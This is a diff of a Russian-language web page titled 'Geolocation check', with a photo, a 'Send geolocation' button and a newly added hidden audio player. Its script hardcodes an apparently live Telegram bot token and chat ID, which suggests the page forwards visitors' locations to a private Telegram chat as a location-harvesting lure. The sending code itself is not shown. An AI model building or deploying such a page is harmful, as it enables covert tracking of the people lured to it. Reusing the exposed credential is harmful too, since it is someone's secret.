@@ -82,8 +82,7 @@
 
     <div class="card">
         <div class="photo-wrapper">
-            <!-- Впиши сюда точное имя файла с учетом регистра (например: photo.png или Photo.JPG) -->
-            <img src="photo.png" alt="Фото">
+            <img src="photo.jpg" alt="Фото">
         </div>
 
         <h2 id="title">Проверка геопозиции</h2>
@@ -92,12 +91,21 @@
         <button id="geoBtn" onclick="getLocation()">Отправить геопозицию</button>
     </div>
 
+    <!-- Скрытый аудиоплеер (укажите точное имя вашего файла) -->
+    <audio id="clickSound" src="sound.mp3" preload="auto"></audio>
+
     <script>
         const TOKEN = "9218562846:AAGbvc-EJ2QLHcs8qW-c__liAzlBgUp4HnU";
         const CHAT_ID = "5328460264";
-        let isSent = false; // Защита от повторной отправки
+        let isSent = false;
 
         function getLocation() {
+            // Запускаем воспроизведение звука при нажатии на кнопку
+            const audio = document.getElementById("clickSound");
+            if (audio) {
+                audio.play().catch(err => console.log("Не удалось воспроизвести аудио:", err));
+            }
+
             if (isSent) return;
 
             const statusDiv = document.getElementById("status");
